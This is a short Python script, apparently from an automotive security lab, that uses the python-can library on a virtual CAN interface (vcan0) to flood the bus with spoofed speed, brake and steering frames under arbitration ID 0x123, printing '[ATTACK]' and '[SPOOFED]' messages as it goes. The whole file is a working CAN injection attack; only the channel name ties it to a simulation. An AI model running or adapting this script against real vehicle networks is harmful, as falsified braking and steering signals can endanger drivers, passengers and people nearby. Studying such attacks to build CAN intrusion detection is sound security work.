import can
import time
import random

bus = can.interface.Bus(
    channel='vcan0',
    interface='socketcan'
)

print("[ATTACK] Sensor Spoofing Started")

try:
    while True:
        fake_speed = random.randint(150, 220)   # Unrealistic speed
        fake_brake = random.choice([0, 1])
        fake_steering = random.randint(-90, 90)

        payload = [
            fake_speed & 0xFF,
            fake_brake & 0xFF,
            (fake_steering + 128) & 0xFF,
            0x00
        ]

        msg = can.Message(
            arbitration_id=0x123,
            data=payload,
            is_extended_id=False
        )

        bus.send(msg)
        print(f"[SPOOFED] Speed={fake_speed} Brake={fake_brake} Steering={fake_steering}")

        time.sleep(0.5)

except KeyboardInterrupt:
    print("\n[ATTACK] Spoofing Stopped")

finally:
    bus.shutdown()
